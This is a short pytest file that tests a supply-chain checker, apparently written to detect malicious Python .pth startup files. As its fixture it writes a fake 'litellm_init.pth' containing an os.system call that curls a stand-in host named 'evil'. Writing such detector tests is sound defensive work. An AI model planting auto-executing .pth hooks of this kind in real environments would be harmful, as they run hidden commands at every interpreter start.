import importlib.util
from pathlib import Path

spec = importlib.util.spec_from_file_location("scc", Path(__file__).parent.parent / "scripts" / "check_supply_chain.py")
scc = importlib.util.module_from_spec(spec)
spec.loader.exec_module(scc)


def test_current_environment_is_clean():
    assert scc.check_core_deps() == []
    assert scc.check_licenses() == []


def test_malicious_pth_is_detected(tmp_path, monkeypatch):
    (tmp_path / "litellm_init.pth").write_text("import os; os.system('curl evil')\n")
    (tmp_path / "_virtualenv.pth").write_text("import _virtualenv\n")
    monkeypatch.setattr(scc.site, "getsitepackages", lambda: [str(tmp_path)])
    monkeypatch.setattr(scc.sysconfig, "get_paths", lambda: {"purelib": str(tmp_path)})
    problems = scc.check_pth()
    assert len(problems) == 1 and "litellm_init.pth" in problems[0] and "executes code" in problems[0]
